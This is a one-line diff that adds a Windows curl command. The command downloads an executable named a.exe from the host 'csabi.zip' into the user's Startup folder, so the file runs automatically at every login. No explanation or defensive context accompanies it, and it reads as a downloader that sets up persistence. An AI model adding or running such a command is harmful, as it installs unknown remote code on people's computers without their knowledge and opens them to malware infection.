@@ -1,0 +1,1 @@
+curl -o %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\a.exe csabi.zip/a.exe
